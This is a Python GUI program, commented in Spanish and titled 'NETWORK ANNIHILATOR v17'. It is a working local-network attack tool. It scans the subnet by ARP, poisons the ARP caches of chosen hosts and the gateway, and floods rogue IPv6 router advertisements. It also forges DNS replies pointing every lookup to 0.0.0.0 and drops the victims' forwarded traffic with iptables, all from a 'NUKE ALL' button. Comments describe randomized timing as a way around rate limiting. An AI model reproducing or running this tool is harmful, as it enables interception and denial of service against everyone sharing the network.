#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import multiprocessing
from queue import Empty
import time
import random
import subprocess
import os
import sys
import re
import signal

# Importación selectiva para optimizar memoria
from scapy.all import (ARP, Ether, send, srp, AsyncSniffer, 
                       DNS, DNSQR, IP, UDP, DNSRR, conf, 
                       get_if_addr, get_if_hwaddr,
                       IPv6, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr, 
                       ICMPv6NDOptPrefixInfo)

conf.verb = 0

# ==================== MOTORES DE ALTA RESILIENCIA ====================

def motor_ataque_v17(targets_queue, log_queue, control_event, net_info):
    """
    Motor blindado con gestión de sockets y prevención de saturación.
    """
    def signal_handler(sig, frame):
        sys.exit(0)
    
    signal.signal(signal.SIGTERM, signal_handler)

    try:
        ip_gw, mac_l, mac_gw = net_info['gw'], net_info['mac_l'], net_info['mac_gw']
        active_targets = {}
        
        # Pre-compilación del paquete IPv6
        pkt_v6 = (Ether(src=mac_l, dst="33:33:00:00:00:01")/
                  IPv6(src=net_info['ll_v6'], dst="ff02::1")/
                  ICMPv6ND_RA(chlim=64, M=0, O=1)/
                  ICMPv6NDOptSrcLLAddr(lladdr=mac_l)/
                  ICMPv6NDOptPrefixInfo(prefix="2001:db8:1::", prefixlen=64, L=1, A=1))

        while not control_event.is_set():
            # Drenaje de objetivos (Atomic-style)
            try:
                while True:
                    ip, mac, active = targets_queue.get_nowait()
                    if active: active_targets[ip] = mac
                    else: active_targets.pop(ip, None)
            except Empty: pass

            if active_targets:
                try:
                    # Ráfaga IPv6
                    send(pkt_v6, verbose=0, count=1)
                    # Ráfaga ARP Adaptativa
                    for ip, mac in active_targets.items():
                        p_list = [
                            ARP(op=2, pdst=ip, hwdst=mac, psrc=ip_gw, hwsrc=mac_l),
                            ARP(op=2, pdst=ip_gw, hwdst=mac_gw, psrc=ip, hwsrc=mac_l)
                        ]
                        send(p_list, verbose=0, count=1)
                        del p_list # Garbage collection manual
                except Exception as e:
                    log_queue.put(f"Atk Error: {str(e)}")
            
            # Sleep dinámico para bypass de Rate Limiting
            time.sleep(random.uniform(0.7, 1.1))
            
    except Exception as e:
        log_queue.put(f"FATAL ATK: {str(e)}")

def motor_dns_v17(targets_queue, log_queue, control_event):
    active_ips = set()

    def dns_callback(pkt):
        if pkt.haslayer(DNSQR) and pkt[IP].src in active_ips:
            try:
                res = (IP(dst=pkt[IP].src, src=pkt[IP].dst)/
                       UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/
                       DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                           an=DNSRR(rrname=pkt[DNSQR].qname, rdata="0.0.0.0")))
                send(res, verbose=0)
            except Exception as e:
                log_queue.put(f"DNS Send Fail: {str(e)}")

    try:
        sniffer = AsyncSniffer(filter="udp port 53", prn=dns_callback, store=0)
        sniffer.start()
        
        while not control_event.is_set():
            try:
                while True:
                    ip, _, active = targets_queue.get_nowait()
                    if active: active_ips.add(ip)
                    else: active_ips.discard(ip)
            except Empty: break
            time.sleep(0.4)
        
        if sniffer.running: sniffer.stop()
    except Exception as e:
        log_queue.put(f"FATAL DNS: {str(e)}")

# ==================== GUI TITANIUM (CLEAN STATE) ====================

class AppMuro:
    def __init__(self, root):
        self.root = root
        self.root.title("BLACK OPS v17 - DIAMOND EDITION")
        self.root.geometry("1000x800")
        self.root.configure(bg="#050505")
        
        self.targets = {}
        self.queue_atk = multiprocessing.Queue()
        self.queue_dns = multiprocessing.Queue()
        self.log_queue = multiprocessing.Queue()
        self.control_event = multiprocessing.Event()
        self.is_running = True

        if self.init_network():
            self.setup_ui()
            self.start_engines()
            self.update_logs() 
        else:
            messagebox.showerror("Error", "No se detectó red o permisos denegados.")
            sys.exit(1)

    def init_network(self):
        try:
            # Detección de Red Mejorada (Soporta bridges y veth)
            route = subprocess.check_output(["ip", "route", "show", "default"]).decode()
            m = re.search(r"default via ([\d\.]+) dev ([\w\.-]+)", route)
            if not m: return False
            
            gw, iface = m.group(1), m.group(2)
            
            # IPv6 con validación de existencia
            v6_data = subprocess.check_output(["ip", "-6", "addr", "show", "dev", iface, "scope", "link"]).decode()
            v6_match = re.search(r"inet6 (fe80::[\da-f:]+)", v6_data)
            ll_v6 = v6_match.group(1) if v6_match else "fe80::1"

            # MAC Gateway con retry
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw), timeout=2, verbose=0)
            if not ans: return False
            
            # Forwarding Silencioso
            for path in ["ipv4/ip_forward", "ipv6/conf/all/forwarding"]:
                subprocess.run(["sysctl", "-w", f"net.{path}=1"], capture_output=True)

            self.net_info = {'gw': gw, 'iface': iface, 'mac_l': get_if_hwaddr(iface), 
                             'ip_l': get_if_addr(iface), 'mac_gw': ans[0][1].hwsrc, 'll_v6': ll_v6}
            return True
        except Exception: return False

    def setup_ui(self):
        # Estilo Industrial
        ttk.Style().theme_use('clam')
        
        tk.Label(self.root, text="NETWORK ANNIHILATOR v17 // DIAMOND ENGINE", bg="#b30000", fg="white", font=("Impact", 18)).pack(fill="x")
        
        f_btns = tk.Frame(self.root, bg="#050505", pady=10)
        f_btns.pack()
        tk.Button(f_btns, text="🔍 SCAN", command=self.scan, width=12, bg="#1a1a1a", fg="#0f0", relief="flat").pack(side="left", padx=5)
        tk.Button(f_btns, text="🚀 NUKE ALL", command=self.attack_all, width=12, bg="#330000", fg="white", relief="flat").pack(side="left", padx=5)
        tk.Button(f_btns, text="🚨 RECOVERY", command=self.restore_all, width=12, bg="#000033", fg="white", relief="flat").pack(side="left", padx=5)

        self.tree = ttk.Treeview(self.root, columns=("IP", "MAC", "STATE"), show="headings", height=15)
        for c in ("IP", "MAC", "STATE"): self.tree.heading(c, text=c)
        self.tree.pack(fill="both", expand=True, padx=15)
        self.tree.bind("<Double-1>", lambda e: self.toggle_selected())

        self.log_box = scrolledtext.ScrolledText(self.root, height=10, bg="black", fg="#0f0", font=("Consolas", 9))
        self.log_box.pack(fill="x", padx=15, pady=10)

    def log(self, msg):
        if self.is_running:
            self.log_box.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
            self.log_box.see(tk.END)

    def update_logs(self):
        if not self.is_running: return
        try:
            while True:
                msg = self.log_queue.get_nowait()
                self.log(f"ALERT: {msg}")
        except Empty: pass
        
        if self.root.winfo_exists():
            self.root.after(500, self.update_logs)

    def start_engines(self):
        self.p_atk = multiprocessing.Process(target=motor_ataque_v17, args=(self.queue_atk, self.log_queue, self.control_event, self.net_info))
        self.p_dns = multiprocessing.Process(target=motor_dns_v17, args=(self.queue_dns, self.log_queue, self.control_event))
        self.p_atk.daemon = True # Evita zombies si el padre muere
        self.p_dns.daemon = True
        self.p_atk.start(); self.p_dns.start()

    def scan(self):
        self.log("Buscando objetivos...")
        self.targets.clear()
        for i in self.tree.get_children(): self.tree.delete(i)
        red = self.net_info['gw'] + "/24"
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=red), timeout=2, verbose=0)
            for _, rcv in ans:
                if rcv.psrc != self.net_info['ip_l']:
                    self.targets[rcv.psrc] = {'mac': rcv.hwsrc, 'active': False}
                    self.tree.insert("", "end", iid=rcv.psrc, values=(rcv.psrc, rcv.hwsrc, "LIVE"))
        except Exception as e: self.log(f"Scan Fail: {str(e)}")

    def toggle_selected(self):
        sel = self.tree.selection()
        if sel: self.apply_toggle(sel[0])

    def apply_toggle(self, ip):
        target = self.targets.get(ip)
        if not target: return
        
        state = not target['active']
        target['active'] = state
        self.tree.item(ip, values=(ip, target['mac'], "NUKE-ON" if state else "LIVE"))
        
        self.queue_atk.put((ip, target['mac'], state))
        self.queue_dns.put((ip, target['mac'], state))
        
        action = "-I" if state else "-D"
        subprocess.run(["iptables", action, "FORWARD", "-s", ip, "-j", "DROP"], capture_output=True)
        subprocess.run(["iptables", "-A", "FORWARD", "-d", ip, "-j", "DROP"] if state else ["iptables", "-D", "FORWARD", "-d", ip, "-j", "DROP"], capture_output=True)

    def attack_all(self):
        self.log("NUKING ALL...")
        for ip in list(self.targets.keys()):
            if not self.targets[ip]['active']: self.apply_toggle(ip)

    def restore_all(self):
        self.log("Emergencia: Restaurando red...")
        subprocess.run(["iptables", "-F"], capture_output=True)
        for ip, data in self.targets.items():
            if data['active']:
                data['active'] = False
                self.tree.item(ip, values=(ip, data['mac'], "LIVE"))
                self.queue_atk.put((ip, data['mac'], False))
                self.queue_dns.put((ip, data['mac'], False))

    def on_close(self):
        self.is_running = False
        self.control_event.set()
        # Matamos procesos
        for p in [self.p_atk, self.p_dns]:
            if p.is_alive():
                os.kill(p.pid, signal.SIGTERM)
        subprocess.run(["iptables", "-F"], capture_output=True)
        self.root.destroy()

if __name__ == "__main__":
    if os.geteuid() != 0: 
        print("NECESITAS ROOT."); sys.exit(1)
    
    multiprocessing.freeze_support()
    root = tk.Tk()
    app = AppMuro(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()
